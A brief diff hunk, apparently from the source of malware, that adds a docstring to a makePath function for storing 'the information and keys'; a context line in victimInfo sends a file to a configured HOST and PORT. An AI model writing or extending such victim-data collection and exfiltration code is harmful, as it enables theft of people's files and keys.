@@ -81,6 +81,10 @@ def victimInfo(filepath: str) -> None:
     sendFile(HOST, PORT, newFilePath)
 
 def makePath() -> str:
+    """
+    Function to make path that we will use for storing the information
+    and keys
+    """
     homepath: str = ""
     filepath: str = ""
     username: str = ""
